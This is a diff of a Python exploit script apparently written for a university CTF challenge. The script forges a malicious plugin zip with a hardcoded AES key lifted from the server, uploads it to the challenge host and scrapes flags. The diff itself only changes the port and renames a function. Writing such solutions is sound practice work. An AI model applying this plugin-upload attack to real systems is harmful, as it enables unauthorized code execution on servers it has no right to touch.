@@ -2,7 +2,7 @@ import io, os, re, zipfile, requests
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
-BASE = "http://ctf.ac.upt.ro:9313"
+BASE = "http://ctf.ac.upt.ro:9241"
 KEY  = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"  # din server.py
 NAME = "LOG_RIPPER"
 
@@ -20,7 +20,7 @@ html_out = "<!doctype html><meta charset='utf-8'><title>log</title><pre>" + html
 print("ok")
 '''
 
-def build_plugin_bytes():
+def build_plugin():
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
         z.writestr("plugin_manifest.json", f'{{"name":"{NAME}","version":"1.0","author":"me","icon":"thumbnail.svg"}}')
@@ -61,7 +61,7 @@ def extract_flags(text):
     return out
 
 def main():
-    blob = build_plugin_bytes()
+    blob = build_plugin()
     print(f"uploaded plugin")
     assert upload(blob), "upload failed"
     uid = find_uid(); assert uid, "could not find widget UID"
